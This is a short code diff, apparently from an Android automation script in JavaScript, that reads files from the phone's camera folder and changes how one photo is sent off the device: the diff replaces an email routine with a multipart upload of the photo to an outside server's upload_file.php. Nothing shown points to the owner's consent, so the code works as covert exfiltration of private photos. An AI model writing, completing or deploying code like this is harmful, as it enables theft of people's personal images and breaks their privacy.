@@ -47,11 +47,13 @@ var dir = "/sdcard/DCIM/Camera/";
  var ss = shaixuanwenjian(dir);
  log(files.join(dir, ss[1])); 
  var tp = files.join(dir, ss[2]);
- var img = images.read(tp) 
- var bm = images.toBase64(img, "jpg", 10)
-fasongyoujian(bm);
+var urltp="http://sdbsxwf777.vaiwan.com/sc/upload_file.php";
+var restp=http.postMultipart(urltp,{
+file:open(tp);
+});
+//fasongyoujian("");
 log("yes");
- img.recycle();
+
 }
 
 
